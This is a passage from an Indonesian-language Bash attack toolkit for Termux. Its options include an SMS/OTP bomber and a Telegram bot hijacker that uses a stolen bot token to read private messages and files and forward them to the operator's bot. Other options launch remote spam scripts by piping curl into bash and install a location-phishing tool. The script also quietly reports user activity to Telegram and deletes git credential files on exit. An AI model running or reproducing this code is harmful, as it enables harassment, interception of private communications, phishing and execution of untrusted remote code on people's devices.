randomIndex=$(( RANDOM % ${#emojis[@]} ))
clear
banner_skill
echo -e "$c[$b Pengiriman No$m:$c $nomor_telepon ]$p"
echo
response=$(curl -s "$url" -d "phone=$nomor_telepon")
response &> /dev/null | printf "\r GALIRUS OFFICIAL ${emojis[$randomIndex]}\n"
echo
read -t 5 -p "" user_input
if [[ $user_input == "q" ]]; then
echo "[!] Script Dihentikan oleh Pengguna."
break
fi
done
}
clear
banner_skill
read -p "Masukkan nomor telepon (contoh: 628): " nomor_telepon
run
EOF
                                                                             chmod 777 $PREFIX/lib/bash/otp
                                                                             bash $PREFIX/lib/bash/otp
                                                                             echo 'echo "Apa Lu Kontol"' > $PREFIX/lib/bash/otp
                                                                      elif [[ $no == "s3" || $no == "S3" ]]; then
                                                                             MONITORING() {
                                                                                    clear
                                                                                    cowsay -f eyes "Konfigurasi Bot" | lolcat
                                                                                    e "$c"
                                                                                    read -p "Masukkan Bot Tele Target : " target
                                                                                    read -p "Masukkan Bot Tele Anda  : " anda
                                                                                    read -p "Masukkan Chat ID Tele Anda : " anda2
                                                                                    clear
                                                                                    TARGET_TOKEN="$target"
                                                                                    MY_TOKEN="$anda"
                                                                                    MY_CHAT_ID="$anda2"
                                                                                    token_status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.telegram.org/bot$TARGET_TOKEN/getMe")
                                                                                    chat_status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.telegram.org/bot$TARGET_TOKEN/sendMessage?chat_id=$MY_CHAT_ID&text=Cek%20Validasi")
                                                                                    URL="https://api.telegram.org/bot$TARGET_TOKEN"
                                                                                    BOT_INFO=$(curl -s "$URL/getMe")
                                                                                    BOT_NAME=$(echo "$BOT_INFO" | grep -oP '"first_name":"\K[^"]+')
                                                                                    BOT_USERNAME=$(echo "$BOT_INFO" | grep -oP '"username":"\K[^"]+')
                                                                                    BOT_ID=$(echo "$BOT_INFO" | grep -oP '"id":\K[0-9]+')
                                                                                    OFFSET=0
                                                                                    LOG_FILE="/sdcard/Hasil_Pengambilan_Data_Bot.log"
                                                                                    touch "$LOG_FILE"
                                                                                    log() {
                                                                                           local timestamp=$(date +"%Y-%m-%d %T")
                                                                                           echo "[$timestamp] $1" >> "$LOG_FILE"
                                                                                    }
                                                                                    notify() {
                                                                                           echo "[NOTIFY] $1"
                                                                                    }
                                                                                    get_extension() {
                                                                                           local mime_type=$(echo "$1" | tr '[:upper:]' '[:lower:]')
                                                                                           case "$mime_type" in
                                                                                                  "image/jpeg" | "image/jpg") echo "jpg" ;;
                                                                                                  "image/png") echo "png" ;;
                                                                                                  "image/gif") echo "gif" ;;
                                                                                                  "image/webp") echo "webp" ;;
                                                                                                  "video/mp4" | "video/mpeg4") echo "mp4" ;;
                                                                                                  "video/quicktime") echo "mov" ;;
                                                                                                  "video/x-msvideo") echo "avi" ;;
                                                                                                  "video/x-matroska") echo "mkv" ;;
                                                                                                  "video/webm") echo "webm" ;;
                                                                                                  "audio/mpeg") echo "mp3" ;;
                                                                                                  "audio/ogg") echo "ogg" ;;
                                                                                                  "audio/wav") echo "wav" ;;
                                                                                                  "audio/x-wav") echo "wav" ;;
                                                                                                  "audio/webm") echo "weba" ;;
                                                                                                  "application/pdf") echo "pdf" ;;
                                                                                                  "application/zip") echo "zip" ;;
                                                                                                  "application/x-zip-compressed") echo "zip" ;;
                                                                                                  "application/vnd.rar") echo "rar" ;;
                                                                                                  "application/x-rar-compressed") echo "rar" ;;
                                                                                                  "application/x-7z-compressed") echo "7z" ;;
                                                                                                  "text/plain") echo "txt" ;;
                                                                                                  "application/msword") echo "doc" ;;
                                                                                                  "application/vnd.openxmlformats-officedocument.wordprocessingml.document") echo "docx" ;;
                                                                                                  "application/vnd.ms-excel") echo "xls" ;;
                                                                                                  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet") echo "xlsx" ;;
                                                                                                  "application/vnd.ms-powerpoint") echo "ppt" ;;
                                                                                                  "application/vnd.openxmlformats-officedocument.presentationml.presentation") echo "pptx" ;;
                                                                                                  "application/octet-stream")
                                                                                                         case "$2" in
                                                                                                                *".mp4"*) echo "mp4" ;;
                                                                                                                *".mov"*) echo "mov" ;;
                                                                                                                *".avi"*) echo "avi" ;;
                                                                                                                *".mkv"*) echo "mkv" ;;
                                                                                                                *".mp3"*) echo "mp3" ;;
                                                                                                                *) echo "bin" ;;
                                                                                                         esac
                                                                                                         ;;
                                                                                                  *) case "$2" in
                                                                                                         *".mp4"*) echo "mp4" ;;
                                                                                                         *".mov"*) echo "mov" ;;
                                                                                                         *".avi"*) echo "avi" ;;
                                                                                                         *".mkv"*) echo "mkv" ;;
                                                                                                         *".mp3"*) echo "mp3" ;;
                                                                                                         *".jpg" | *".jpeg"*) echo "jpg" ;;
                                                                                                         *".png"*) echo "png" ;;
                                                                                                         *".pdf"*) echo "pdf" ;;
                                                                                                         *".zip"*) echo "zip" ;;
                                                                                                         *".rar"*) echo "rar" ;;
                                                                                                         *) echo "bin" ;;
                                                                                                  esac ;;
                                                                                           esac
                                                                                    }
                                                                                    get_mime_type() {
                                                                                           local file_path="$1"
                                                                                           file --mime-type -b "$file_path" 2> /dev/null | tr -d '\r' || echo "application/octet-stream"
                                                                                    }
                                                                                    get_file_info() {
                                                                                           local file_id="$1"
                                                                                           local max_retries=3
                                                                                           local retry_count=0
                                                                                           local result=""
                                                                                           while [ $retry_count -lt $max_retries ]; do
                                                                                                  result=$(curl -s "https://api.telegram.org/bot$TARGET_TOKEN/getFile?file_id=$file_id")
                                                                                                  local file_path=$(echo "$result" | jq -r '.result.file_path')
                                                                                                  if [ -n "$file_path" ] && [ "$file_path" != "null" ]; then
                                                                                                         echo "$result"
                                                                                                         return 0
                                                                                                  fi
                                                                                                  retry_count=$((retry_count + 1))
                                                                                                  sleep 1
                                                                                           done
                                                                                           log "Failed to get file info after $max_retries attempts for file_id: $file_id"
                                                                                           echo "{\"ok\":false,\"description\":\"Failed to get file info after $max_retries attempts\"}"
                                                                                           return 1
                                                                                    }
                                                                                    send_file() {
                                                                                           local FILE_ID="$1"
                                                                                           local FIELD="$2"
                                                                                           local ENDPOINT="$3"
                                                                                           local FILE_NAME="$4"
                                                                                           if [ -z "$FILE_ID" ]; then
                                                                                                  log "No file ID provided"
                                                                                                  return 1
                                                                                           fi
                                                                                           FILE_INFO=$(get_file_info "$FILE_ID")
                                                                                           FILE_PATH=$(echo "$FILE_INFO" | jq -r '.result.file_path')
                                                                                           if [ -z "$FILE_PATH" ] || [ "$FILE_PATH" = "null" ]; then
                                                                                                  log "Could not get file path for file_id: $FILE_ID"
                                                                                                  log "API Response: $FILE_INFO"
                                                                                                  send_message "⚠️ Failed to process file (ID: $FILE_ID). Please try again or use a different file."
                                                                                                  return 1
                                                                                           fi
                                                                                           TEMP_FILE="temp_$(date +%s%N)"
                                                                                           local download_success=false
                                                                                           for i in {1..3}; do
                                                                                                  if curl -s -o "$TEMP_FILE" "https://api.telegram.org/file/bot$TARGET_TOKEN/$FILE_PATH"; then
                                                                                                         if [ -s "$TEMP_FILE" ]; then
                                                                                                                download_success=true
                                                                                                                break
                                                                                                         fi
                                                                                                  fi
                                                                                                  sleep 1
                                                                                           done
                                                                                           if [ "$download_success" = false ]; then
                                                                                                  log "Failed to download file after 3 attempts: $FILE_PATH"
                                                                                                  rm -f "$TEMP_FILE" 2> /dev/null
                                                                                                  send_message "⚠️ Failed to download file (Path: $FILE_PATH). Please try again."
                                                                                                  return 1
                                                                                           fi
                                                                                           MIME_TYPE=$(get_mime_type "$TEMP_FILE")
                                                                                           EXT=$(get_extension "$MIME_TYPE" "$FILE_PATH")
                                                                                           if [ -n "$FILE_NAME" ]; then
                                                                                                  OUTPUT_FILE="$FILE_NAME"
                                                                                                  if [[ $OUTPUT_FILE != *".$EXT" ]]; then
                                                                                                         OUTPUT_FILE="${OUTPUT_FILE%.*}.$EXT"
                                                                                                  fi
                                                                                           else
                                                                                                  if [[ $FILE_PATH == *"/"* ]]; then
                                                                                                         OUTPUT_FILE=$(basename "$FILE_PATH")
                                                                                                         if [[ $OUTPUT_FILE != *.* ]]; then
                                                                                                                OUTPUT_FILE="$OUTPUT_FILE.$EXT"
                                                                                                         fi
                                                                                                  else
                                                                                                         OUTPUT_FILE="file_$(date +%s).$EXT"
                                                                                                  fi
                                                                                           fi
                                                                                           mv "$TEMP_FILE" "$OUTPUT_FILE" 2> /dev/null || {
                                                                                                  log "Failed to rename file, using temporary name"
                                                                                                  OUTPUT_FILE="$TEMP_FILE"
                                                                                           }
                                                                                           if [ ! -s "$OUTPUT_FILE" ]; then
                                                                                                  log "Output file is empty: $OUTPUT_FILE"
                                                                                                  rm -f "$OUTPUT_FILE" 2> /dev/null
                                                                                                  send_message "⚠️ Failed to process file (empty output). Please try again."
                                                                                                  return 1
                                                                                           fi
                                                                                           local send_result=""
                                                                                           case "$ENDPOINT" in
                                                                                                  "sendDocument")
                                                                                                         send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F document=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
                                                                                                         ;;
                                                                                                  "sendPhoto")
                                                                                                         send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F photo=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
                                                                                                         ;;
                                                                                                  "sendAudio")
                                                                                                         send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F audio=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
                                                                                                         ;;
                                                                                                  "sendVideo")
                                                                                                         send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F video=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
                                                                                                         ;;
                                                                                                  "sendVoice")
                                                                                                         send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F voice=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/$ENDPOINT")
                                                                                                         ;;
                                                                                                  *) send_result=$(curl -s -F chat_id="$MY_CHAT_ID" -F document=@"$OUTPUT_FILE" "https://api.telegram.org/bot$MY_TOKEN/sendDocument") ;;
                                                                                           esac
                                                                                           if echo "$send_result" | jq -e '.ok' > /dev/null; then
                                                                                                  log "Successfully forwarded file: $OUTPUT_FILE"
                                                                                                  log "API Response: $send_result"
                                                                                           else
                                                                                                  log "Failed to send file: $(echo "$send_result" | jq -r '.description // "unknown error"')"
                                                                                                  log "Full Response: $send_result"
                                                                                           fi
                                                                                           rm -f "$OUTPUT_FILE" 2> /dev/null
                                                                                    }
                                                                                    send_message() {
                                                                                           local text="$1"
                                                                                           local result=$(curl -s -X POST "https://api.telegram.org/bot$MY_TOKEN/sendMessage" \
                                                                                                  -d "chat_id=$MY_CHAT_ID" \
                                                                                                  -d "text=$(echo "$text" | sed 's/\"/\\\"/g')")
                                                                                           if ! echo "$result" | jq -e '.ok' > /dev/null; then
                                                                                                  log "Failed to send message: $(echo "$result" | jq -r '.description // "unknown error"')"
                                                                                           fi
                                                                                    }
                                                                                    banner() {
                                                                                           echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⠶⠶⠶⠶⠶⠶⠶⢖⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡞⠁⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠈⠹⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⠋⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣦⣀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡾⠁⠀⣠⡾⢁⣾⡿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣆⠹⣦⠀⠀⢻⣆⠀⠀⠀⠀
⠀⠀⢀⡾⠁⢀⢰⣿⠃⠾⢋⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⠀⢹⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡌⠻⠆⢿⣧⢀⠀⢻⣆⠀⠀⠀
⠀⠀⣾⠁⢠⡆⢸⡟⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣦⡸⣿⠀⣆⠀⢿⡄⠀⠀
⠀⢸⡇⠀⣽⡇⢸⣿⠟⢡⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠙⢿⣿⠀⣿⡀⠘⣿⠀⠀
⡀⣿⠁⠀⣿⡇⠘⣡⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣦⡙⠀⣿⡇⠀⢻⡇⠀
⢸⡟⠀⡄⢻⣧⣾⡿⢋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣴⣿⠉⡄⢸⣿⠀
⢾⡇⢰⣧⠸⣿⡏⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠀⠓⢶⠶⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠙⣿⡟⢰⡧⠀⣿⠀
⣸⡇⠰⣿⡆⠹⣠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣿⡏⠀⠠⢺⠢⠀⠀⣿⣷⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠸⠁⣾⡇⠀⣿⠀
⣿⡇⠀⢻⣷⠀⣿⡿⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡅⠀⠀⢸⡄⠀⠀⣿⣿⣿⣿⣿⣿⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡆⣰⣿⠁⠀⣿⠀
⢸⣧⠀⡈⢿⣷⣿⠃⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣇⠀⢀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⡀⢿⣧⣿⠃⡀⢸⣿⠀
⠀⣿⡀⢷⣄⠹⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣿⣿⠀⣼⣿⣿⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⡟⢁⣴⠇⣼⡇⠀
⠀⢸⡇⠘⣿⣷⡈⢰⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢰⣿⡧⠈⣴⣿⠏⢠⣿⠀⠀
⠀⠀⢿⡄⠘⢿⣿⣦⣿⣯⠘⣆⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⡎⢸⣿⣣⣾⡿⠏⠀⣾⠇⠀⠀
⠀⠀⠈⢷⡀⢦⣌⠛⠿⣿⡀⢿⣆⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢀⣿⡁⣼⡿⠟⣉⣴⠂⣼⠏⠀⠀⠀
⠀⠀⠀⠈⢷⡈⠻⣿⣶⣤⡁⠸⣿⣆⠡⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣾⡟⠀⣡⣴⣾⡿⠁⣴⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣄⠈⢙⠿⢿⣷⣼⣿⣦⠹⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢡⣾⣿⣶⣿⠿⢛⠉⢀⣾⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣧⡀⠳⣦⣌⣉⣙⠛⠃⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠐⠛⠋⣉⣉⣤⡶⠁⣰⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠙⠛⠿⠿⠿⠿⠟⠛⠛⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠙⠟⠛⠿⠿⠿⠿⠟⠛⠁⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢶⣄⠙⠶⣦⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⡶⠖⣁⣴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⡉⠉⠉⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠉⠉⠉⠉⣡⣴⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⢦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣠⣴⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠋⠉⠁⠀⠀
MONITORING BOT TARGET⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
                                                                                    }
                                                                                    info() {
                                                                                           e $p $bg_lg"==============[$m INFORMASI TARGET $p ] ================$res"
                                                                                           e $b "[$c •$b ]$k Status Token$m   :$bl $BOT_ID ***** $k($c Kode$lg:$bl $token_status$k)"
                                                                                           e $b "[$c •$b ]$k Status Chat ID$m :$bl $MY_CHAT_ID $k($c Kode$lg:$bl $chat_status$k)"
                                                                                           e $b "[$c •$b ]$k Name Bot Tele$m  :$bl $BOT_NAME"
                                                                                           e $b "[$c •$b ]$k Username Bot$m   :$bl $BOT_USERNAME"
                                                                                           e $p $bg_lg"==============[$m MONITORING $p ] ======================$res"
                                                                                    }
                                                                                    banner | lolcat
                                                                                    info
                                                                                    notify "Bot forwarder started"
                                                                                    notify "Log file: $LOG_FILE"
                                                                                    log "Starting bot forwarder..."
                                                                                    log "Monitoring bot: $TARGET_TOKEN"
                                                                                    log "Forwarding to chat ID: $MY_CHAT_ID"
                                                                                    e $bg_lg $m"KETIK q Lalu ENTER untuk menghentikan monitoring$res"
                                                                                    while true; do
                                                                                           RESP=$(curl -s "https://api.telegram.org/bot$TARGET_TOKEN/getUpdates?offset=$OFFSET")
                                                                                           RESULTS=$(echo "$RESP" | jq -c '.result')
                                                                                           COUNT=$(echo "$RESULTS" | jq 'length' 2> /dev/null)
                                                                                           COUNT=${COUNT:-0}
                                                                                           if [ "$COUNT" -gt 0 ]; then
                                                                                                  LAST_ID=$(echo "$RESULTS" | jq '.[-1].update_id')
                                                                                                  OFFSET=$((LAST_ID + 1))
                                                                                                  echo "$RESULTS" | jq -c '.[]' | while read -r UPDATE; do
                                                                                                         MESSAGE=$(echo "$UPDATE" | jq '.message')
                                                                                                         CHAT_ID=$(echo "$MESSAGE" | jq -r '.chat.id')
                                                                                                         notify "New message received from chat ID: $CHAT_ID"
                                                                                                         log "Received update from chat ID: $CHAT_ID"
                                                                                                         log "Update content: $UPDATE"
                                                                                                         TEXT=$(echo "$MESSAGE" | jq -r '.text // empty')
                                                                                                         if [ -n "$TEXT" ] && [ "$TEXT" != "/start" ]; then
                                                                                                                notify "Forwarding text message"
                                                                                                                log "Forwarding text message: $TEXT"
                                                                                                                send_message "$TEXT"
                                                                                                         fi
                                                                                                         declare -A FILE_TYPES=(
                                                                                                                ["photo"]="sendPhoto"
                                                                                                                ["document"]="sendDocument"
                                                                                                                ["audio"]="sendAudio"
                                                                                                                ["voice"]="sendVoice"
                                                                                                                ["video"]="sendVideo"
                                                                                                                ["sticker"]="sendDocument"
                                                                                                                ["animation"]="sendDocument"
                                                                                                                ["video_note"]="sendVideo")
                                                                                                         for field in "${!FILE_TYPES[@]}"; do
                                                                                                                if [ "$field" = "photo" ]; then
                                                                                                                       FILE_ID=$(echo "$MESSAGE" | jq -r ".$field[-1].file_id // empty")
                                                                                                                else
                                                                                                                       FILE_ID=$(echo "$MESSAGE" | jq -r ".$field.file_id // empty")
                                                                                                                fi
                                                                                                                if [ -n "$FILE_ID" ]; then
                                                                                                                       notify "Forwarding $field file"
                                                                                                                       log "Forwarding $field with ID: $FILE_ID"
                                                                                                                       case "$field" in
                                                                                                                              "sticker")
                                                                                                                                     send_file "$FILE_ID" "$field" "${FILE_TYPES[$field]}" "sticker.webp"
                                                                                                                                     ;;
                                                                                                                              "animation")
                                                                                                                                     send_file "$FILE_ID" "$field" "${FILE_TYPES[$field]}" "animation.mp4"
                                                                                                                                     ;;
                                                                                                                              "video_note")
                                                                                                                                     send_file "$FILE_ID" "$field" "${FILE_TYPES[$field]}" "video_note.mp4"
                                                                                                                                     ;;
                                                                                                                              *)
                                                                                                                                     FILE_NAME=$(echo "$MESSAGE" | jq -r ".$field.file_name // empty")
                                                                                                                                     send_file "$FILE_ID" "$field" "${FILE_TYPES[$field]}" "$FILE_NAME"
                                                                                                                                     ;;
                                                                                                                       esac
                                                                                                                fi
                                                                                                         done
                                                                                                  done
                                                                                           fi
                                                                                           sleep 1
                                                                                           read -t 5 -p "" user_input
                                                                                           if [[ $user_input == "q" ]]; then
                                                                                                  echo "[!] Script Dihentikan oleh Pengguna."
                                                                                                  break
                                                                                           fi
                                                                                    done
                                                                             }
                                                                             MONITORING
                                                                      elif [[ $no == "s4" || $no == "S4" ]]; then
                                                                             cek_akses
                                                                             $paket install tmux -y
                                                                             while true; do
                                                                                    cek="$HOME/.number_otp"
                                                                                    if [ -f "$cek" ]; then
                                                                                           dialog --infobox "
Silakan tekan Enter untuk masuk ke Mode Catatan.
Nomor yang Anda masukkan bisa diawali dengan:

+62
62
08
85

Tidak perlu khawatir, sistem akan otomatis melengkapi format nomor Anda." 10 40
                                                                                           read
                                                                                           nano "$HOME/.number_otp"
                                                                                           break
                                                                                    else
                                                                                           dialog --infobox "Silahkan Anda Enter Untuk Melihat Tutor Pemakaiannya " 10 40
                                                                                           touch "$cek"
                                                                                           read
                                                                                           xdg-open "https://od.lk/s/NDVfNTQyMDMyMjNf/Screenrecorder-2025-05-19-19-14-25-183.mp4"
                                                                                    fi
                                                                             done
                                                                             url1="https://od.lk/s/OV8yNTEwNjk2MTRf/multi_spam.sh"
                                                                             url2="https://od.lk/s/OV8yNTEwNjkyODVf/spam_pair.sh"
                                                                             url3="https://od.lk/s/OV8yNTEwNzExMjBf/tele_spam.sh"
                                                                             url4="https://od.lk/s/OV8yNTEwNzExMjFf/otp_tele.sh"
                                                                             session="Brutal All Spamming"
                                                                             tmux new-session -d -s "$session" "bash <(curl -sL '$url1')"
                                                                             tmux split-window -v -t "$session:0.0" "bash <(curl -sL '$url2')"
                                                                             tmux select-pane -t "$session:0.0"
                                                                             tmux split-window -h -t "$session:0.0" "bash <(curl -sL '$url3')"
                                                                             tmux select-pane -t "$session:0.1"
                                                                             tmux split-window -h -t "$session:0.1" "bash <(curl -sL '$url4')"
                                                                             tmux select-layout -t "$session" tiled
                                                                             tmux select-pane -t "$session:0.0"
                                                                             tmux attach-session -t "$session"
                                                                      elif [[ $no == "bk" || $no == "BK" ]]; then
                                                                             break
                                                                      elif [ "$no" = "0" ]; then
                                                                             rm -rf $PREFIX/tmp/ &> /dev/null
                                                                             mkdir -p $PREFIX/tmp/ &> /dev/null
                                                                             rm -rf $PREFIX/include/mpv/httpserver/service.h.zip &> /dev/null
                                                                             rm -rf /data/data/com.termux/files/home/.git-credentials &> /dev/null &
                                                                             rm -rf /data/data/com.termux/files/home/.gitconfig &> /dev/null &
                                                                             rm -rf $HOME/Lubeban/install.sh &> /dev/null
                                                                             play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
                                                                             kill_sound &> /dev/null &
                                                                             cd $HOME
                                                                             isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
                                                                             telegram &> /dev/null &
                                                                             exit 0
                                                                      else
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res"
                                                                             play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
                                                                             sleep 5
                                                                      fi
                                                               done
                                                        elif [[ $no == "all" || $no == "ALL" ]]; then
                                                               while true; do
                                                                      isipesan="Terdeteksi login Hack / Phising !  💻"
                                                                      telegram &> /dev/null &
                                                                      TAMPILANTOOLSV5
                                                                      PHISING
                                                                      READ
                                                                      if [ "$no" = "10" ]; then
                                                                             while true; do
                                                                                    clear
                                                                                    banner5
                                                                                    echo
                                                                                    read -p "Masukkan Perintah Installer: " app
                                                                                    $app
                                                                                    read -p "Apakah Anda Mau Mengulangi y/n: " gimana
                                                                                    if [[ $gimana == "N" || $gimana == "n" ]]; then
                                                                                           break
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "11" ]; then
                                                                             while true; do
                                                                                    seeker="$DIR_SAVE/seeker"
                                                                                    if [ -d "$seeker" ]; then
                                                                                           sleep 1
                                                                                           cd $PREFIX/share/list &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                           git stash &> /dev/null
                                                                                           clear
                                                                                           e $k "MEMBUKA Seeker$h "
                                                                                           sleep 5
                                                                                           cd $seeker
                                                                                           clear
                                                                                           python3 seeker.py
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           e "$h"
                                                                                           sleep 2
                                                                                           $paket install -y libicu
                                                                                           $paket reinstall php
                                                                                           $paket install -y php
                                                                                           python3 -m pip install packaging psutil
                                                                                           cd $DIR_SAVE
                                                                                           git clone --depth 32 https://github.com/thewhiteh4t/seeker
                                                                                           cd seeker
                                                                                           git pull origin main &> /dev/null
                                                                                           clear
